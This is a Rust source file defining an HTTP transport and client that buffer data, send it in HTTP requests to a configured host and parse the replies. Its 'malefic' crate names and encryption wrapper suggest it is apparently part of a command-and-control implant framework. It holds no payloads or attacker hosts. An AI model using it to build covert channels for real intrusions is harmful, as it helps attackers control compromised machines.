use crate::config::HTTP;
use crate::transport::tcp::TCPTransport;
use crate::transport::{DialerExt, Stream, TransportError};
use crate::common::spawn;
use anyhow::Result;
use async_net::TcpStream;
use async_trait::async_trait;
use futures::lock::Mutex;
use futures::{AsyncRead, AsyncWrite, AsyncWriteExt};
use malefic_helper::debug;
use std::io;
use std::io::{Cursor, Read};
use std::pin::Pin;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::task::{Context, Poll, Waker};
use malefic_proto::crypto::Cryptor;

#[derive(Clone)]
pub struct HTTPTransport {
    inner: Arc<Mutex<Option<TCPTransport>>>,
    host: String,
    send_buffer: Arc<Mutex<Vec<u8>>>,
    recv_buffer: Arc<Mutex<Cursor<Vec<u8>>>>,
    flush_requested: Arc<AtomicBool>,
    read_waker: Arc<Mutex<Option<Waker>>>,
}

impl HTTPTransport {
    pub async fn new(url: String) -> Result<Self> {
        let transport = HTTPTransport {
            inner: Arc::new(Mutex::new(None)),
            host: url,
            send_buffer: Arc::new(Mutex::new(Vec::new())),
            recv_buffer: Arc::new(Mutex::new(Cursor::new(Vec::new()))),
            flush_requested: Arc::new(AtomicBool::new(false)),
            read_waker: Arc::new(Mutex::new(None)),
        };

        {
            let mut bg_transport = transport.clone();
            let flag = transport.flush_requested.clone();
            spawn(async move {
                loop {
                    if flag.swap(false, Ordering::SeqCst) {
                        let _ = bg_transport.done().await;
                        break
                    }
                    futures_timer::Delay::new(std::time::Duration::from_millis(1)).await;
                }
            });
        }

        Ok(transport)
    }

    /// Helper method to read a chunk from transport
    async fn read_chunk(&self, size: usize) -> Result<Vec<u8>> {
        let mut inner_guard = self.inner.lock().await;
        let transport = inner_guard.as_mut().unwrap();

        let mut chunk_buf = vec![0u8; size];
        let n = futures::AsyncReadExt::read(transport, &mut chunk_buf).await?;
        if n == 0 {
            return Err(TransportError::RecvError.into());
        }
        chunk_buf.truncate(n);
        Ok(chunk_buf)
    }

    async fn done(&mut self) -> Result<()> {
        let send_data = {
            let buffer = self.send_buffer.lock().await;
            buffer.clone()
        };

        self.do_request(send_data).await?;
        {
            let mut buffer = self.send_buffer.lock().await;
            buffer.clear();
        }

        debug!("[transport] HTTP request completed, data available for reading");
        Ok(())
    }

    async fn ensure_connection(&mut self) -> Result<()> {
        let mut inner_guard = self.inner.lock().await;
        if inner_guard.is_none() {
            let stream = TcpStream::connect(&self.host).await?;
            let transport = TCPTransport::new(stream).await?;
            *inner_guard = Some(transport);
            debug!("[transport] HTTP connection established");
        }
        Ok(())
    }

    async fn do_request(&mut self, data: Vec<u8>) -> Result<()> {
        self.ensure_connection().await?;

        // 发送HTTP请求
        {
            let mut inner_guard = self.inner.lock().await;
            let transport = inner_guard.as_mut().unwrap();
            let mut request_buffer = Vec::with_capacity(HTTP.len() + 50 + data.len());
            request_buffer.extend_from_slice(HTTP.as_bytes());
            request_buffer.extend_from_slice(format!("Content-Length: {}\r\n\r\n", data.len()).as_bytes());
            request_buffer.extend_from_slice(&data);
            transport.write_all(&request_buffer).await?;
        }

        // 读取HTTP响应头部
        let mut buffer = Vec::with_capacity(1024);
        let (header_buf, body_prefix) = loop {
            let chunk = self.read_chunk(512).await?;
            buffer.extend_from_slice(&chunk);

            // 查找头部结束位置
            if let Some(header_end_pos) = buffer.windows(4).position(|window| window == b"\r\n\r\n").map(|pos| pos + 4) {
                debug!("[transport] found header end at position: {}", header_end_pos);
                let (header_part, body_part) = buffer.split_at(header_end_pos);
                break (header_part.to_vec(), body_part.to_vec());
            }

            if buffer.len() > buffer.capacity() - 512 {
                buffer.reserve(1024);
            }
        };

        // 解析HTTP响应
        let mut headers = [httparse::EMPTY_HEADER; 16];
        let mut resp = httparse::Response::new(&mut headers);
        match resp.parse(&header_buf)? {
            httparse::Status::Complete(_) => {
                // 提取Content-Length
                let content_length = resp.headers
                    .iter()
                    .find(|h| h.name.eq_ignore_ascii_case("content-length"))
                    .and_then(|h| std::str::from_utf8(h.value).ok())
                    .and_then(|s| s.parse::<usize>().ok())
                    .unwrap_or(0);

                if content_length == 0 {
                    let mut buffer = self.recv_buffer.lock().await;
                    *buffer = Cursor::new(Vec::new());
                    return Ok(());
                }

                debug!("[transport] recv body expect:{}", content_length);
                self.read_response_body(content_length, body_prefix).await
            }
            httparse::Status::Partial => Err(TransportError::RecvError.into()),
        }
    }



    // 读取HTTP响应体
    async fn read_response_body(&mut self, expected_length: usize, body_prefix: Vec<u8>) -> Result<()> {
        debug!("[transport] starting to read response body, expected: {} bytes, prefix: {} bytes", expected_length, body_prefix.len());

        // 初始化接收缓冲区
        {
            let mut buffer = self.recv_buffer.lock().await;
            if !body_prefix.is_empty() {
                *buffer = Cursor::new(body_prefix.clone());
                if let Some(waker) = self.read_waker.lock().await.take() {
                    waker.wake();
                }
            } else {
                *buffer = Cursor::new(Vec::with_capacity(expected_length));
            }
        }

        let mut remaining = expected_length.saturating_sub(body_prefix.len());
        debug!("[transport] after adding prefix, remaining: {} bytes", remaining);

        while remaining > 0 {
            let chunk_size = remaining.min(8192).max(512);
            let chunk = match self.read_chunk(chunk_size).await {
                Ok(chunk) => chunk,
                Err(_) => {
                    debug!("[transport] recv empty chunk, remaining: {}", remaining);
                    futures_timer::Delay::new(std::time::Duration::from_millis(10)).await;
                    continue;
                }
            };

            {
                let mut buffer = self.recv_buffer.lock().await;
                buffer.get_mut().extend_from_slice(&chunk);
                if let Some(waker) = self.read_waker.lock().await.take() {
                    waker.wake();
                }
            }
            remaining -= chunk.len();
            debug!("[transport] read chunk: {} bytes, remaining: {}", chunk.len(), remaining);
        }

        debug!("[transport] response body read complete, total: {} bytes", expected_length);
        Ok(())
    }
}

impl AsyncRead for HTTPTransport {
    fn poll_read(
        self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &mut [u8],
    ) -> Poll<io::Result<usize>> {
        match self.recv_buffer.try_lock() {
            Some(mut cursor) => {
                let available = cursor.get_ref().len() - cursor.position() as usize;
                if available == 0 {
                    if let Some(mut waker_guard) = self.read_waker.try_lock() {
                        *waker_guard = Some(cx.waker().clone());
                    }
                    return Poll::Pending;
                }

                let read_len = available.min(buf.len());
                let n = cursor.read(&mut buf[..read_len]).unwrap_or(0);
                Poll::Ready(Ok(n))
            }
            None => {
                cx.waker().wake_by_ref();
                Poll::Pending
            }
        }
    }
}

impl AsyncWrite for HTTPTransport {
    fn poll_write(
        self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<io::Result<usize>> {
        match self.send_buffer.try_lock() {
            Some(mut buffer) => {
                buffer.extend_from_slice(buf);
                Poll::Ready(Ok(buf.len()))
            }
            None => {
                cx.waker().wake_by_ref();
                Poll::Pending
            }
        }
    }

    fn poll_flush(self: Pin<&mut Self>, _cx: &mut Context<'_>) -> Poll<io::Result<()>> {
        self.flush_requested.store(true, Ordering::SeqCst);
        Poll::Ready(Ok(()))
    }

    fn poll_close(self: Pin<&mut Self>, _cx: &mut Context<'_>) -> Poll<io::Result<()>> {
        self.flush_requested.store(true, Ordering::SeqCst);
        Poll::Ready(Ok(()))
    }
}

#[derive(Clone)]
pub struct HTTPClient {
    pub stream: Stream,
}

impl HTTPClient{
    pub fn new(cryptor: Cryptor) -> Result<Self> {
        Ok(HTTPClient {
            stream: Stream { cryptor },
        })
    }
}

#[async_trait]
impl DialerExt for HTTPClient {
    async fn connect(&mut self, addr: &str) -> Result<HTTPTransport> {
        debug!("[transport] Connecting to HTTP server at {}", addr);
        HTTPTransport::new(addr.to_string()).await
    }
}
